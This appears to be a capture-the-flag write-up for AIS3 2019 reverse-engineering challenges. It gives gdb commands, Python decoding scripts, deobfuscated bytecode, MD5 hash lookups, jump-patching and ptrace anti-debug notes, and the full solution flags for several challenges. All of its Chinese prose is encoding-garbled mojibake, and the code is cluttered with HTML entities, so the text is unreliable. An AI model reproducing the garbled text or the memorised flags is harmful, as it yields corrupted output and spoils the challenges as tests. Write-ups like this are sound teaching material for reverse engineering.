çš„é¬¼æ±è¥¿ï¼Œé€™æ™‚å€™å¦‚æœä½ é¡˜æ„è¿‘ä¸€é»çœ‹çš„è©±æœƒç™¼ç¾å®ƒå°±æ˜¯ä¸€è‡‰è¿·å®®æ¨£ï¼š é€™æ™‚ä½ è…¦è¢‹è£¡æ‡‰è©²é£›å‡ºå¹¾å€‹ DFSï¼ŒBFSä¹‹é¡çš„æ¼”ç®—æ³•ï¼Œç„¶è€Œä½ ä¸¦ä¸çŸ¥é“èµ·é»è·Ÿçµ‚é»ï¼Œä¸çŸ¥é“è¦å¾å“ªèµ°åˆ°å“ªï¼Œäº‹å¯¦ä¸Šå¦‚æœä½ çœŸçš„èµ°å‡ºä¾†æ‡‰è©²ä¹Ÿæ˜¯ä¸€å¨å±ï¼Œé€™æ™‚å€™é¡Œç›®æœ‰å€‹å¥½åƒæ²’å•¥é¬¼ç”¨çš„æç¤º ×ª×™×‘×ª × ×—ï¼Œæ©ï¼Œä»–æ˜¯è«¾äºæ–¹èˆŸçš„æ„æ€ï¼Œä¸€å€‹ä½ è§£å®Œæ‰æœƒçŸ¥é“é€™æ˜¯ä»€éº¼æ„æ€çš„æç¤ºã€‚ç¸½ä¹‹é€™é¡Œå…¶å¯¦è·Ÿ FloodFill æœ‰é—œï¼Œä½ å¯ä»¥è€ƒæ…®é›•ä¸€å€‹ç°¡å–®çš„è…³æœ¬ï¼Œæˆ–æ˜¯ï¼Œæ›´ç°¡å–®çš„ï¼Œç”¨å°ç•«å®¶çš„å¡«å……å·¥å…·å°±å¥½äº†ã€‚å¦‚æœä½ éƒ½å¾ˆæ‡¶ï¼Œæˆ‘å·²ç¶“å¯«å¥½ä¸€å€‹æ”¾åœ¨ github è£¡é¢äº†æ‹¿ä¾†è·‘è·‘çœ‹å°±çŸ¥é“äº†ï¼Œçµæœå¤§æ¦‚æ˜¯åƒé€™æ¨£å­ï¼š Trivialreconbinary åªæœƒæª¢æŸ¥ä½ çš„è¼¸å…¥é•·åº¦æ˜¯å¦æ˜¯ 60ï¼Œå¦‚æœç¬¦åˆçš„è©±ï¼Œå°±æœƒæŠŠ flag è¤‡è£½åˆ°å‰›å‰›ç”¨ä¾†è¼¸å…¥çš„ bufferï¼Œä½†æ˜¯ä¸æœƒåˆ—å°å‡ºä¾†ï¼Œæ¯”è¼ƒ naive çš„æ–¹æ³•å°±æ˜¯çœ‹æ‡‚ code ç„¶å¾ŒæŠŠ flag æ‰‹å‹•æ‹¼å›ä¾†ï¼Œç›´è¦ºåˆå¿«é€Ÿçš„åšæ³•æ˜¯ä½¿ç”¨ gdbã€‚ solvegdb-peda$ b putsgdb-peda$ run &lt;&lt;&lt; `python -c &#x27;print(&quot;a&quot;*60)&#x27;`gdb-peda$ find AIS3Searching for &#x27;AIS3&#x27; in: None rangesFound 7 results, display max 7 items:Trivial : 0x555555554798 (rex.B)[stack] : 0x7fffffffdb90 (&quot;AIS3&#123;This_is_a_rea&quot;, &#x27;l&#x27; &lt;repeats 11 times&gt;, &quot;y_boariiing_challenge&#125;aaaaaaaaa&quot;)[stack] : 0x7fffffffe06e (&quot;AIS3_2019_staff/Trivial/Trivial&quot;)[stack] : 0x7fffffffe174 (&quot;AIS3_2019_staff/Trivial&quot;)[stack] : 0x7fffffffe82c (&quot;AIS3_2019_staff/Trivial&quot;)[stack] : 0x7fffffffef86 (&quot;AIS3_2019_staff/Trivial/Trivial&quot;)[stack] : 0x7fffffffefd8 (&quot;AIS3_2019_staff/Trivial/Trivial&quot;) AIS3&#123;This_is_a_reallllllllllly_boariing_challenge&#125; TsaiBroreconåŸºæœ¬ä¸Šå°±æ˜¯ Tap codeï¼Œæ¯å€‹ç™¼è²¡å¾Œé¢è·Ÿè‘—ä¸åŒæ•¸é‡çš„.ï¼Œæ¯å…©å€‹å¯ä»¥å°æ‡‰æ‰¾å‡ºä¸€å€‹å–®å­—ï¼Œä¾‹å¦‚ç™¼è²¡.ç™¼è²¡.æ˜¯aï¼Œç™¼è²¡.ç™¼è²¡..æ˜¯bï¼Œå¯«å€‹è§£ç¢¼çš„è…³æœ¬å°±å¥½äº†ã€‚ solvesolve.py#!/usr/bin/env python3table = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;_&#x27;]f = open(&quot;./flag.txt&quot;,&quot;r&quot;).read().split(&#x27;\\n&#x27;)[1]f = f.split(&quot;ç™¼è²¡&quot;)[1:]for i in range(0,len(f),2): print(table[(len(f[i])-1)*8+len(f[i+1])-1],end=&#x27;&#x27;) HolyGrenadereconé€™é¡Œçµ¦çš„æ˜¯ä¸€å€‹ pyc æª”æ¡ˆï¼Œè£¡é¢æ˜¯ python çš„ bytecodeï¼Œå¯ä»¥ç”¨ uncompyle ä¹‹é¡çš„å·¥å…·æŠŠä»–å¼„å› python çš„æ¨£å­ï¼Œå¼„å›ä¾†ä¹‹å¾Œæœƒæ˜¯ä¸€ä»½è¢«æ··æ·†éçš„ python script solvedecompileHolyGrenade.pyfrom secret import flagfrom hashlib import md5if 64 - 64: i11iIiiIiidef OO0o ( arg ) : arg = bytearray ( arg , &#x27;ascii&#x27; ) for Oo0Ooo in range ( 0 , len ( arg ) , 4 ) : O0O0OO0O0O0 = arg [ Oo0Ooo ] iiiii = arg [ Oo0Ooo + 1 ] ooo0OO = arg [ Oo0Ooo + 2 ] II1 = arg [ Oo0Ooo + 3 ] arg [ Oo0Ooo + 2 ] = II1 arg [ Oo0Ooo + 1 ] = O0O0OO0O0O0 arg [ Oo0Ooo + 3 ] = iiiii arg [ Oo0Ooo ] = ooo0OO return arg . decode ( &#x27;ascii&#x27; ) if 64 - 64: Oooo % OOO0O / II1Ii / Oooflag += b&quot;0&quot; * ( len ( flag ) % 4 )if 63 - 63: iI11i11IiIiII + oo00oOOo * Oooo000o % OOo . OOOfor Oo0Ooo in range ( 0 , len ( flag ) , 4 ) : print ( OO0o ( md5 ( bytes ( flag [ Oo0Ooo : Oo0Ooo + 4 ] ) ) . hexdigest ( ) ) ) if 27 - 27: Iii1IIIiiI + iI - Oo / iII11iiIII111 % iiiIIii1I1Ii . O00oOoOoO0o0O deobfuscateæœ€å¥½çš„æ–¹æ³•å°±æ˜¯ï¼Œæ‰‹å‹•æŠŠå®ƒä¿®å¥½ XDï¼Œç¸½ä¹‹ä¿®å¥½ä¹‹å¾Œå¤§æ¦‚é•·é€™æ¨£ source.pyfrom secret import flagfrom hashlib import md5def rearrange( arg ): arg = bytearray(arg,&#x27;ascii&#x27;) for i in range(0,len(arg),4): a = arg[i] b = arg[i+1] c = arg[i+2] d = arg[i+3] arg[i+2] = d arg[i+1] = a arg[i+3] = b arg[i] = c return arg.decode(&#x27;ascii&#x27;)flag += b&quot;0&quot;*(len(flag)%4)for i in range(0,len(flag),4): print(rearrange(md5(bytes(flag[i:i+4])).hexdigest())) decodeå¯ä»¥çœ‹å¾—å‡ºä¾†ï¼Œflag çš„æ¯ 4 å€‹å­—å…ƒè¢«æ‹¿å»åš md5 ä¹‹å¾Œåˆè¢«é‡æ–°æ’åˆ—äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥æŠŠé¡Œç›®çµ¦çš„output.txtä¿®å¾©å¥½ä¹‹å¾Œï¼Œé€ä¸Šç·šä¸Šçš„ md5 ç¶²ç«™å°±å¯ä»¥æ‹¿å› flag äº† solve.py#!/usr/bin/env python3f = open(&quot;output.txt&quot;,&#x27;r&#x27;).read().split(&#x27;\\n&#x27;)[:-1]def rearrange( arg ): arg = bytearray(arg,&#x27;ascii&#x27;) for i in range(0,len(arg),4): a = arg[i] b = arg[i+1] c = arg[i+2] d = arg[i+3] arg[i+1] = d arg[i+2] = a arg[i] = b arg[i+3] = c return arg.decode(&#x27;ascii&#x27;)for i in f: print(rearrange(i)) md5 crackæ‹¿çµæœå»é¤µ https://hashkiller.co.uk/Cracker/MD5 aab3fb739ad2d154fe856818d66b6427 MD5 AIS3 343e0b500b25058ed52de927ca6bbd87 MD5 &#123;7he dc719b0b22f0fc5a6dfbfc0ee60c70a8 MD5 re_1 cd9e8edd75eb88b7873d9eab7dd685fe MD5 5_th 6d740b3c874058ca047ab375ecb662f6 MD5 e_k1 18fed6fa3fcf748e9530a6e10296c446 MD5 ll3r 73d9c19bea1d91abb5f0f4eb24e9f567 MD5 _ra6 a05e1b0e95d57c4566877d1b7eb27872 MD5 61t&#125; or osCommerce 61:t&#125; 0neWayreconç°¡å–®åˆ†æå¯ä»¥ç™¼ç¾ï¼Œé€™å€‹ binary æœƒå•ä½ ä¸‰å€‹å•é¡Œä¾†é©—è­‰ä½ çš„èº«ä»½ï¼Œé©—è­‰çš„æ–¹æ³•æ˜¯æŠŠä½ æ‰€æœ‰çš„å›ç­”ä¸²æ¥å†ä¸€èµ·å¾Œä¸Ÿé€²ä¸€å€‹å¾ˆåƒæ˜¯ hash çš„ function ä¸­è¨ˆç®—ï¼Œå³ hash(ans1||ans2||ans3) == 8932587927620123215ï¼ŒåŒæ™‚ä¹Ÿæœƒè¨ˆç®—å…¶é•·åº¦æ˜¯å¦ç¬¦åˆ hash(strlen(ans1||ans2||ans3)) == 177593ï¼Œè€Œé€™å€‹å¾ˆåƒ hash çš„ functionï¼Œå®ƒäº‹å¯¦ä¸Šå°±æ˜¯ä¸€å€‹åŠŸèƒ½æ­£å¸¸çš„å°å·§ djb2 hash functionï¼Œä¹Ÿå°±æ˜¯ç¬¦åˆ onewaynessï¼Œç„¡æ³•ç›´æ¥é€†æ¨ã€‚ åœ¨å°é€™å€‹ hash function ä¸€ç„¡æ‰€çŸ¥çš„æƒ…æ³ä¸‹ï¼Œå…¶å¯¦ google ç®—å¼å°±èƒ½æ‰¾åˆ°äº†ï¼Œå†è€…ï¼Œé€éç°¡å–®çš„å¯¦é©—æ‡‰è©²å¯ä»¥ç™¼ç¾ï¼Œé€™å€‹ hash ä¸¦æ²’æœ‰æ˜é¡¯å¯ä»¥é€†é‹ç®—çš„ç‰¹å¾µï¼Œè€Œå­—ä¸²é•·åº¦ä¹Ÿè®“æš´åŠ›ç ´è§£æ³•æ™‚é–“æˆæœ¬å¾ˆé«˜ï¼Œå› æ­¤é€™æ™‚å€™æ‡‰è©²è€ƒæ…®çš„äº‹æƒ…æ˜¯ï¼Œé€™æ•´å€‹åŠ å¯†çš„éç¨‹ï¼Œé‚„æœ‰å“ªè£¡æ˜¯è„†å¼±çš„ã€‚ è§€å¯Ÿç¨‹å¼æµç¨‹ï¼Œå¯ä»¥ç™¼ç¾å¦‚æœé€šé hash çš„é©—è­‰ï¼Œç¨‹å¼å°‡æœƒä»¥å¾ªç’° xor çš„æ–¹å¼ä¾†è§£ç¢¼ä¸€å€‹ jpg æª”æ¡ˆï¼Œè€Œæˆ‘å€‘çŸ¥é“ jpg æ˜¯æœ‰ç‰¹å®š header çš„ï¼Œ$jpg\\oplus key &#x3D; cipher$ æ‰€ä»¥åšé€†é‹ç®—å°±å¯ä»¥å¾—åˆ° keyï¼Œ$cipher \\oplus jpg &#x3D; key$ï¼Œä½†äº‹å¯¦ä¸Šä¸¦ä¸éœ€è¦å¦‚æ­¤è²»å·¥ã€‚ key leakå› ç‚º jpeg æœ‰ä¸€æ®µ App makers çš„æ¨™ç±¤ï¼Œé€™è£¡æœ‰é€£çºŒé‡è¤‡çš„ 0x20ï¼Œæ‰€ä»¥å°è‡´ cipher ä¸­ leak äº† keyï¼Œ ä»”ç´°çœ‹ cipher çš„ hex å°±æœƒç™¼ç¾ä¸é çš„åœ°æ–¹æœ‰ä¸€æ®µ data é•·é€™æ¨£ ï¼š 4550 4554 4e49 4e49 1212 4944 4944 4e4f EPETNINI..IDIDNO5448 4156 4550 4554 4e49 4e49 1212 4944 THAVEPETNINI..ID4944 4e4f 5448 4156 4550 4554 4e49 4e49 IDNOTHAVEPETNINI1212 4944 4944 4e4f 5448 4156 4550 4554 ..IDIDNOTHAVEPET4e49 4e49 1212 4944 4944 4e4f 5448 4156 NINI..IDIDNOTHAV4550 4554 4e49 4e49 1212 4944 4944 4e4f EPETNINI..IDIDNO5448 4156 4550 4554 4e49 4e49 1212 4944 THAVEPETNINI..ID4944 4e4f 5448 4156 4550 4554 4e49 4e49 IDNOTHAVEPETNINI1212 4944 4944 4e4f 5448 4156 4550 4554 ..IDIDNOTHAVEPET4e49 4e49 1212 4944 4944 4e4f 5448 4156 NINI..IDIDNOTHAV... solveè¦æ±‚é©—è­‰çš„æ™‚å€™æœ‰èªªéå…¨éƒ¨å°å¯«ï¼Œæ‰€ä»¥ä¸é›£ç™¼ç¾é€™ä¸€æ®µ data æœ‰è¢« xor 0x20ï¼Œé‚„åŸå¾Œå¯ä»¥çŸ¥é“ä¸‰æ®µé©—è­‰çš„ç­”æ¡ˆæ˜¯ niniï¼Œ22ï¼Œididnothavepetï¼Œæ‹¿å›å»é¤µ binary å°±å¯ä»¥å¾—åˆ° flag äº†ã€‚ æ›´ç°¡å–®çš„åšæ³•ï¼ŒæŠŠ cipher dump å‡ºä¾†åš frequency analysis å¯ä»¥ç›´æ¥çŒœå‡º keyã€‚ MasterPieceé€™é¡Œèˆ‡ Game åŸºæœ¬ä¸Šå°±æ˜¯ä¸å¸Œæœ›å¤§å®¶ç›´æ¥çœ‹æ•´ä»½ code ï¼Œå…¶å¯¦æœ‰è¨±å¤šæ˜é¡¯çš„æ–·é»å¯ä»¥è®“ä½ ç›´æ¥æ‰¾åˆ°é—œéµçš„ code éƒ¨åˆ†ã€‚ reconç°¡å–®è©¦ç©ä¸€ä¸‹å¯ä»¥ç™¼ç¾ï¼Œæ‡‰è©²æ˜¯è¦ç•«å‡º flag çš„æ¨£å­è®“ä»–å½ˆå‡ºæ­£ç¢ºçš„è¨Šæ¯ï¼Œå¦å‰‡ä»–å°±æœƒä¸€ç›´å½ˆå‡º That is not the flag, that&#39;s your ugly assçš„è¦–çª—ï¼Œé€éé€™å€‹ç‰¹é»ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ ida çš„ string æ‰¾åˆ°é—œéµçš„ code åœ¨ sub_140001220ã€‚ æ¥ä¸‹ä¾†å°±æ˜¯çœ‹ code if ( v2 )&#123; v14 = QString::fromAscii_helper(&quot;Yes, that the flag !!&quot;, 21i64); ...&#125;else&#123; v13 = QString::fromAscii_helper(&quot;That is not the flag, that&#x27;s your ugly ass&quot;, 42i64); ...&#125; å¾€ä¸Šçœ‹é‚„æœ‰å“ªè£¡ä¿®æ”¹ v2ï¼Œä¸Šé¢å¯èƒ½è¦èŠ±ä¸€é»æ™‚é–“çœ‹ï¼Œä¸éé‚Š google Qt ç›¸é—œ function é‚Šçœ‹æ‡‚æ‡‰è©²ä¸æ˜¯å•é¡Œï¼Œsource code æ˜¯é•·é€™æ¨£ï¼š image.fill(qRgb(255, 255, 255));for( int row = 0 ; row &lt; image.height() ; row++)&#123; for( int col = 0 ; col &lt; image.width() ; col++)&#123; if( bitmap[row][col] != flag[row*image.width()+col])&#123; pass = false; break; &#125; &#125;&#125; flag é™£åˆ—å°±æ˜¯ ida ä¸­çš„ byte_14006B000ï¼Œå…¶å¯¦å°±æ˜¯ä¸€å † 0 è·Ÿ 1 è€Œå·²ï¼Œä¸€å€‹ä»£è¡¨é»‘è‰²ä¸€å€‹ä»£è¡¨ç™½è‰²ï¼Œæ‰€ä»¥æŠŠ byte_14006B000 dump å‡ºä¾†å°±å¯ä»¥äº†ï¼Œé€™è£¡æœ‰å€‹å•é¡Œå°±æ˜¯ï¼Œæˆ‘å€‘ä¸¦ä¸çŸ¥é“ image.height() è·Ÿ image.width() æ˜¯ä»€éº¼ï¼Œä¸éé€™å¯ä»¥ç”¨ x64dbg ç›´æ¥è§€å¯Ÿçµæœï¼Œå› ç‚ºåœ–ç‰‡çš„å¤§å°ä¸¦ä¸æœƒæ”¹è®Šã€‚ solvesolve.py#!/usr/bin/env python3import numpy as npfrom PIL import Imageimport randomimport stringf = open(&quot;./flag.dump&quot;,&quot;r&quot;).read().split(&#x27;,&#x27;)w = 650h = 410arr = np.zeros([h,w])for i in range(h): for j in range(w): arr[i][j] = 255 if f[i*w+j] == &#x27;1&#x27; else 0img = Image.fromarray(np.uint8(arr),&quot;L&quot;)img.save(&quot;flag.png&quot;) Gameé€™é¡Œèˆ‡ MasterPiece åŸºæœ¬ä¸Šå°±æ˜¯ä¸å¸Œæœ›å¤§å®¶ç›´æ¥çœ‹æ•´ä»½ code ï¼Œå…¶å¯¦æœ‰è¨±å¤šæ˜é¡¯çš„æ–·é»å¯ä»¥è®“ä½ ç›´æ¥æ‰¾åˆ°é—œéµçš„ code éƒ¨åˆ†ã€‚ reconé€™é‚Šä½¿ç”¨ memory scan çš„æ–¹å¼ä¾†æ‰¾åˆ°é—œéµçš„ code ï¼Œç°¡å–®éŠç©å¹¾æ¬¡å¾Œå¯ä»¥ç™¼ç¾ï¼Œæ¯æ®ºæ­»ä¸€å€‹æ€ªï¼Œåœ°æ¯¯çš„é¡è‰²å°±æœƒæ”¹è®Šï¼ˆéŒ¯éçš„æ€ªå°‡æœƒç›´æ¥éºå¤±ç›¸é—œè¨Šæ¯ï¼ŒåŸºæœ¬ä¸Šæ¯éš»éƒ½æ‡‰è©²è¦æ‰“åˆ°ï¼Œä¸éé‚„æ˜¯å¯ä»¥ç”¨çŒœçš„ï¼‰ï¼Œ15*15æ ¼çš„åœ°æ¯¯å…¶å¯¦å°±é¡ä¼¼è·‘é¦¬ç‡ˆï¼Œéäº†4é—œä»¥å¾Œæœƒç™¼ç¾æ€ªçš„é€Ÿåº¦é–‹å§‹å¢åŠ ï¼Œæˆ‘å€‘å…ˆç°¡å–®æƒæ score çš„è®ŠåŒ–ä¾†æ‰¾åˆ°å­˜ score çš„è®Šæ•¸è¨˜æ†¶é«”ä½ç½®åœ¨å“ªï¼š ç„¶å¾Œæ¥ä¸‹ä¾†æ‰¾æ˜¯å“ªå€‹ instruction åœ¨ä¿®æ”¹ scoreï¼š æœ€å¾Œ show assembly ä¾†è§€å¯Ÿå…¶é™„è¿‘çš„é‚è¼¯ï¼š é€™é‚Šæœ‰å€‹æœ‰è¶£çš„æ–¹æ³•ï¼Œå› ç‚ºæˆ‘å€‘çŸ¥é“æˆ‘å€‘ç¾åœ¨è™•åœ¨çš„é‚è¼¯æ˜¯ æˆ‘æ‰“æ­»äº†æ€ªï¼Œæˆ‘è¦å¢åŠ  score çš„ branch ç•¶ä¸­ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å¤§è†½çŒœæ¸¬å¾€å‰ä¸€é»æ‡‰è©²è¦æœ‰åˆ¤æ–·æ˜¯ä¸æ˜¯æ“Šä¸­çš„é‚è¼¯ï¼Œç•¶ç„¶ä¹Ÿæœ‰å¯èƒ½é€™åªæ˜¯ä¸€å€‹ add_score() çš„å‡½å¼ï¼Œä¸éå‰é¢çš„code å¾ˆå¤šï¼Œå¯ä»¥è©¦è©¦çœ‹ï¼Œè‡³æ–¼è©¦è©¦çœ‹çš„æ–¹æ³•å°±æ˜¯ï¼Œæ‰‹å·¥ fuzz ï¼ŒæŠŠè·³è½‰çš„æ¢ä»¶ nop æ‰æˆ–æ˜¯æ”¹æˆç›¸åçš„åˆ¤æ–·ï¼Œä¾‹å¦‚ if(bullet.x &gt; enemy.x)&#123;a&#125;else&#123;b&#125; çµ„åˆèªè¨€å¯èƒ½å°±æœƒæ˜¯ jbï¼Œå¦‚æœæŠŠ jb æ”¹æˆ nopï¼Œé‚£å°±æ°¸é éƒ½æœƒåŸ·è¡Œ &#123;a&#125; éƒ¨åˆ†çš„ codeï¼Œé‡æ–°å˜—è©¦å¹¾æ¬¡å¯ä»¥çœ‹åˆ°ä¸‹é¢é€™éƒ¨åˆ†çš„ code æ˜¯åˆ¤æ–·å­å½ˆæ˜¯å¦æœ‰æ‰“åˆ°æ€ªï¼š æŠŠä¸Šåœ–çš„ jl æ”¹æˆ nop å°±å¯ä»¥å…¨åœ–æ‰“æ€ªäº†ï¼Œä¸éæˆ‘æ²’æœ‰æ‰“ç®—é€™æ¨£å°±çµ¦ flagï¼Œç­‰åˆ°ç¬¬å››é—œçš„æ™‚å€™æœƒè®Šé€Ÿï¼Œå–®ç´”æŒ‰è‘— space ä¾†ä¸åŠæ‰“å®Œï¼Œæœƒéºå¤±å¾ˆå¤šçš„è¨Šæ¯ï¼Œå°è‡´çœ‹ä¸çŸ¥é“ç›®å‰åˆ°åº•æ‹šå‡ºäº†ä»€éº¼å–®å­—ï¼Œé€™æ™‚å€™æˆ‘å€‘è¦åšçš„å°±æ˜¯ï¼Œå» ida çœ‹æˆ‘å€‘å‰›å‰›æ‰¾åˆ°çš„é€™äº› code é™„è¿‘åˆ°åº•é‚„æœ‰ä»€éº¼æ±è¥¿ï¼Œæœ‰å¾ˆå¤šåšæ³•ï¼ŒæŠŠæ€ªé€Ÿåº¦æ”¹æˆ0æ…¢æ…¢æ‰“ï¼ŒæŠŠå­å½ˆæ”¹æ›´å¿«ï¼ŒæŠŠ flag è¨Šæ¯å¾©åŸç›´æ¥ç•«åœ–ç­‰ç­‰ï¼Œæœ€ç°¡å–®çš„å°±æ”¹é€Ÿåº¦ã€‚å°æ‡‰çš„ä½ç½®åœ¨ ida ä¸­çš„ sub_1400030F0()ï¼Œé€™è£¡é¢æœ‰ä¸€äº›å¥‡æ€ªçš„æ±è¥¿ï¼Œä¾‹å¦‚ LODWORD(v53) = rand() % 720;ï¼Œäº‚æ”¹å¯ä»¥ç™¼ç¾é€™å€‹æ˜¯ç”Ÿæˆçš„ä½ç½®ï¼Œæˆ–æ˜¯ if ( (signed int)result &lt;= 3 ) v26 = 0.1;else v26 = 1.1; äº‚æ”¹å¾Œå¯ä»¥ç™¼ç¾é€™å€‹æ˜¯æ€ªçš„é€Ÿåº¦ï¼Œç¸½ä¹‹é€™é‚Šå°±æ˜¯çœ‹ code çš„ä¸Šä¸‹æ–‡ï¼Œé€éå‰›å‰› recon éšæ®µè’é›†åˆ°çš„è³‡è¨Šï¼Œå»æ¯”å°æ¯ä¸€æ®µ code å¤§è‡´ä¸Šæœƒæ˜¯åœ¨è™•ç†ä»€éº¼é‚è¼¯ã€‚åŸºæœ¬ä¸ŠæŠŠé€Ÿåº¦æ”¹æˆ 0 æ…¢æ…¢ç©å°±æœƒéäº†ï¼Œå› ç‚ºé è¨­é‚„æ˜¯å¸Œæœ›å¤§å®¶æŠŠä»–å¼„å¿«ä¸€é»ï¼Œæ‰€ä»¥ flag é•·åº¦æœ‰æ•…æ„æ‹‰é•·ï¼Œè®“æ…¢æ…¢ç©çš„äººæ™šä¸€é»æ‹¿åˆ° flagã€‚é¿å…å¤§å®¶è¦ºå¾—æˆ‘è±ªæ´¨ï¼Œæ ¹æœ¬é»‘ç®±ä¸å‡ºä¾†ï¼Œä¸‹é¢æ˜¯ @segno éŒ„ä¸‹ä¾†çš„è§£æ³•ï¼š The `` tag is not supported by your browser. BigO1é€™é¡Œçœ‹ source code æ‡‰è©²å°±æœƒæç„¶å¤§æ‚Ÿäº†å§ï¼Ÿç¸½ä¹‹é€™æ˜¯è¶…ç´šè¶…ç´šè¶…è¶…ç´šå¼±åŒ–ç‰ˆæœ¬äº†ï¼Œé€™é¡Œä¾†è‡ª flare-on 2018 çš„å…¶ä¸­ä¸€é¡Œï¼Œé€™é¡Œä¸€ç›´æ²’è¾¦æ³•ç”¨ gdb debug çš„åŸå› å¾ˆç°¡å–®ï¼Œæˆ‘åœ¨ main ä¹‹å‰ ptrace äº†æ•´æ”¯ç¨‹å¼ï¼Œæ‰€ä»¥ gdb è¦ ptrace çš„æ™‚å€™å°±æœƒè¢«æˆ‘å¯«çš„ ptrace åµæ¸¬åˆ°ï¼Œé€™æ‡‰è©²å¾ˆå¥½ç™¼ç¾ï¼Œå› ç‚ºæœ‰äº›è¢« print å‡ºä¾†çš„å¥å­ä¸¦æ²’æœ‰åœ¨ main è£¡é¢è¢« print å‡ºä¾†ã€‚ é€™å€‹ binary è¦æ±‚ä½ è¼¸å…¥ 999 æŠŠ keyï¼Œæ¯æ¬¡é©—è­‰å®Œä¸€æŠŠ key å¾Œï¼Œå°±æœƒæŠŠä»– xor ä¸€æ®µå¯«æ­»çš„ data array ï¼Œ 999 è¼ªå¾Œå°±æŠŠè©² data array å°å‡ºä¾†ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“æˆ‘å€‘è¦åšçš„äº‹æƒ…å°±æ˜¯é€šéæ¯å€‹é©—è­‰ï¼Œç„¶å¾Œè§£å‡º flagï¼Œé€™è£¡éœ€è¦é€†å‘çš„æ˜¯ binary æ€éº¼æ¨£ä¾†é©—è­‰æˆ‘å€‘çš„ key æ˜¯ä¸æ˜¯æ­£ç¢ºçš„ï¼Œç„¶å¾Œå› ç‚ºæˆ‘æ²’æœ‰åš code æ®µçš„åŠ å¯†ï¼Œä¸ç„¶æœƒå¤ªé›£ï¼Œæ‰€ä»¥é€™å€‹ binary æ˜¯ static linkï¼Œä¸ç„¶é¦¬ä¸Šå°±å¯ä»¥ç™¼ç¾æ—é‚Šæœ‰ä¸€äº›å¥‡æ€ªçš„ function ã€‚ æ±ºå®šè¦æ€éº¼é©—è­‰ flag çš„ struct å¦‚ä¸‹ ï¼š struct Check&#123; void (*func)() ; char* input; int offset; int chr_idx; int check_len; int verify[2];&#125; checker; func æ˜¯ä¸€å€‹æŒ‡å‘ verify_[1-5] å…¶ä¸­ä¸€å€‹ function çš„å‡½å¼æŒ‡æ¨™ï¼Œä¸éé€™æ¨£æœƒè®Šå¾—å¤ªç°¡å–®ï¼Œå› ç‚º ida èªå¾—å‡ºä¾†ï¼Œæ‰€ä»¥æˆ‘æœ‰å¹«ä»–åŠ ä¸Šåç§»ï¼Œå¯¦éš›ä¸Šä»–æ˜¯ verify_[1-5]-offsetï¼Œæ‰€ä»¥éœæ…‹åˆ†æå¾—æ™‚å€™æ˜¯ä¸æœƒè¢«è§£æçš„ï¼Œä»–æœƒåœ¨åŸ·è¡Œçš„æ™‚å€™åœ¨ check()ä¸­é‡æ–°è¨ˆç®—çœŸæ­£çš„ function åœ¨å“ªï¼š checker.func = data[idx].func+checker.offset; æ¯æŠŠ key çš„é•·åº¦æ˜¯ 70byte ï¼Œæ¯å€‹é©—è­‰ function æœƒé©—è­‰å…¶ä¸­çš„ 1~2byte ï¼Œä¸æœƒé‡è¤‡é©—è­‰é©—è­‰éçš„ byteï¼Œä¹Ÿå°±æ˜¯æ¯å€‹ function åªæœƒç®—å‡ºå”¯ä¸€è§£ï¼Œä¸éœ€è¦è¤‡é›œçš„é‹ç®—ï¼Œç¸½å…±åªæœ‰ 5 å€‹é©—è­‰ functionï¼Œå»çœ‹ source code å§ï¼ŒåŸºæœ¬ä¸Šæ˜¯å¾ˆç°¡å–®çš„é‹ç®—ï¼Œ fibonacci æˆ–æ˜¯å–®ç´”ä¹˜æ³•æˆ–æ˜¯å–®ç´” xor è€Œå·²ã€‚ æ‰€ä»¥è¦åšçš„äº‹æƒ…å°±æ˜¯ï¼Œå¾©åŸ struct ï¼ŒçŸ¥é“ä»–æ‰“ç®—é©—è­‰ä»€éº¼ï¼Œé©—è­‰å“ªå¹¾ byteï¼Œå°æ‡‰çš„é©—è­‰å‡½å¼æ˜¯ä»€éº¼ã€‚é€™é¡Œå°±å…ˆä¸å…¬å¸ƒè§£æ³•çš„è…³æœ¬äº†ï¼Œç•™ä¸€é¡Œçµ¦å¤§å®¶ç•¶æš‘å‡ä½œæ¥­ï¼Œå‘µå‘µï¼Œé€™é¡Œé›£é»å°±æ˜¯é€†å‘è€Œå·²ï¼Œè…³æœ¬ç·´ç¿’ä¸€ä¸‹å•Šã€‚ä¸éç®—å¥½çš„ key.txt å·²ç¶“æ”¾åœ¨ github ä¸Šäº†ï¼ŒæŠŠ key é¤µçµ¦ binary çš„æ–¹æ³•ï¼š cat key.txt | ./BigO1 